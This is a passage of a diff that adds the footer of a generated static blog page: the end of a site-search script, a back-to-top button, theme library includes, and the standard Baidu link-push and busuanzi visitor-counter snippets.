+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
 
 </body>
+
 </html>
